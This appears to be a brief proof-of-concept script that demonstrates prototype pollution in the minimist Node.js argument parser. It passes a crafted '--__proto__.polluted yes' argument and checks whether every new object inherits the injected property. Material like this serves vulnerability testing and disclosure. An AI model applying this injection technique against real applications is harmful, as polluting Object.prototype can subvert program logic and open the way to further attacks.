var obj = {};
obj.__proto__.polluted = undefined;
Object.defineProperty(obj, '__proto__', {
    value: obj.__proto__,
    writable: true,
    enumerable: true,
    configurable: true
});
console.log({}.polluted);
require('minimist')('--__proto__.polluted yes'.split(' '));
console.log({}.polluted);